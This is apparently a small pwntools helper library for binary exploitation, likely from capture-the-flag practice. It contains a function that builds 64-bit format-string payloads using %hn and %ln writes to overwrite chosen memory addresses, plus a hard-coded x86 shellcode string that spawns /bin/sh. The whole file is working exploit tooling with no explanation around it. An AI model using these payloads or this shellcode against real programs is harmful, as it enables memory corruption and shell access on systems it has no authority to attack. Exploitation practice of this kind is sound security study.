from pwn import *

def hello():
    print('hello! :)')

def fmt64(offset, addr, value, b=3):
    payload = ''
    prev = 0

    if value == 0:
        payload += '%{}$ln'.format(offset + 1)
        payload += 'A' * ((8 - len(payload) % 8) % 8)
        payload += p64(addr)
        return payload

    for i in range(b):
        target = (value >> (i * 16)) & 0xffff
        
        if prev < target:
            payload += '%{}c'.format(target - prev)
        elif prev > target:
            payload += '%{}c'.format(0x10000 + target - prev)

        payload += '%xx$hn'
        prev = target

    payload += 'A' * ((8 - len(payload) % 8) % 8)

    for i in range(b):
        idx = payload.find("%xx$hn")
        off = offset + (len(payload) / 8) + i
        payload = payload[:idx] + '%{}$hn'.format(off) + payload[idx+6:]

    payload += 'A' * ((8 - len(payload) % 8) % 8)

    for i in range(b):
        payload += p64(addr + i * 2)
    
    return payload

def shellcode_x86():
    return "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
